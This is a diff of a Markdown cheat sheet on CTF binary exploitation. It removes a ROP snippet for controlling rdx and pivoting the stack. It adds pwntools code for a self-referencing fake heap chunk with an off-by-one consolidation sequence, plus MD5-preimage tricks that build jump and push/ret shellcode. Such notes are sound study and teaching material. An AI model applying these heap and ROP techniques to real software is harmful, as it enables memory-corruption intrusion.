@@ -106,24 +106,7 @@ Default action `0x7fff0000` = `SCMP_ACT_ALLOW`
 
 ## rdx Control in ROP Chains
 
-After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.
-
-**Solutions:**
-1. **pop rdx gadget from libc** — `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
-2. **Re-enter binary's read setup** — Jump to code that sets `rdx` before `read`:
-   ```python
-   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
-   # Set rbp first so rbp-0x40 points to target buffer:
-   POP_RBP_RET = 0x40113d
-   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]
-
-   payload += p64(POP_RBP_RET)
-   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
-   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
-   # WARNING: After read, code continues to printf + leave;ret
-   # leave sets rsp=rbp, so you get a stack pivot to rbp!
-   ```
-3. **Stack pivot via leave;ret** — When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.
+See [rop-and-shellcode.md](rop-and-shellcode.md#rdx-control-in-rop-chains) for full details and code examples.
 
 ---
 
@@ -175,12 +158,39 @@ mangled_fd = target_addr ^ (current_chunk_addr >> 12)
 3. After consolidation, overlapping chunks enable tcache poisoning
 4. Overwrite `stdout` or `_IO_list_all` for FSOP
 
-**Key requirement:** Self-pointing unlink trick is essential:
+**Key requirement:** Self-pointing unlink trick is essential. The fake chunk must pass `unlink_chunk()` which checks `FD->bk == P && BK->fd == P` and (for large chunks) `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`:
+
 ```python
-# Fake chunk at target must have:
-# fd = bk = &fake_chunk
-# fd_nextsize = bk_nextsize = &fake_chunk
+# Fake chunk layout (at known heap address fake_addr):
+#   chunk header:
+#     prev_size:      don't care
+#     size:           target_size | PREV_INUSE  (must match consolidation math)
+#     fd:             fake_addr   (self-referencing)
+#     bk:             fake_addr   (self-referencing)
+#     fd_nextsize:    fake_addr   (self-referencing, needed for large chunks)
+#     bk_nextsize:    fake_addr   (self-referencing)
+
+fake_chunk = flat({
+    0x00: p64(0),                # prev_size
+    0x08: p64(target_size | 1),  # size with PREV_INUSE set
+    0x10: p64(fake_addr),        # fd -> self
+    0x18: p64(fake_addr),        # bk -> self
+    0x20: p64(fake_addr),        # fd_nextsize -> self
+    0x28: p64(fake_addr),        # bk_nextsize -> self
+}, filler=b'\x00')
+
+# Victim chunk's prev_size must equal distance from fake_chunk to victim
+# Off-by-one NUL clears victim's PREV_INUSE bit
+# free(victim) triggers backward consolidation: merges with fake_chunk
+# Result: consolidated chunk overlaps other live allocations
 ```
+
+**Setup sequence:**
+1. Allocate chunks A (large, will hold fake chunk), B (filler), C (victim with off-by-one)
+2. Write fake chunk into A with self-referencing pointers
+3. Trigger off-by-one on C to clear B's PREV_INUSE and set B's prev_size
+4. Free B → consolidates backward into A → overlapping chunk
+5. Allocate over the overlap region to control other live chunks
 
 ---
 
@@ -567,9 +577,18 @@ for (uint64_t ctr = 0; ; ctr++) {
 - `cd80` = `int 0x80`
 - `40` + NOP = `inc eax`
 
-**Hashchain v2 (4-byte prefix):** Store 4-byte MD5 prefixes at chosen offsets. Build `push <addr>; ret` gadget:
-- Word 0: `68 <low3bytes>` (push instruction, 4 bytes)
-- Word 1: `<high_byte> c3` (remaining byte + ret)
+**Hashchain v1 (JMP to NOP sled):** RWX buffer at `0x40000000` + NOP sled at `0x41000000`. Find MD5 preimage starting with `0xE9` (jmp rel32) that lands in the sled:
+```python
+# Brute-force: find input whose MD5 starts with E9 and offset lands in NOP sled
+# Example: b"v" + b"G" * 86 → MD5 starts with e9 59 1f 2c → jmp 0x412c1f5e
+```
+
+**Hashchain v2 (3-hash chain):** Store MD5 digests at user-controlled offsets. Build instruction chain:
+- **Offset 0 (jmp +2):** Find input whose MD5 starts with `EB 02` (e.g., `143874`)
+- **Offset 4 (push win):** Find input whose MD5 starts with `68 XX XX XX` matching win() address bytes
+- **Offset 8 (ret):** Find input whose MD5 byte[1] is `C3` (e.g., `5488` → `56 C3`)
+
+**Pre-computation approach:** Build lookup table mapping MD5 4-byte prefixes to inputs. At runtime, parse win() address from server banner, look up matching push-hash input.
 
 **Brute-force time:** 32-bit prefix match: ~2^32 hashes (~60s on 8 cores). 16-bit: instant.
 
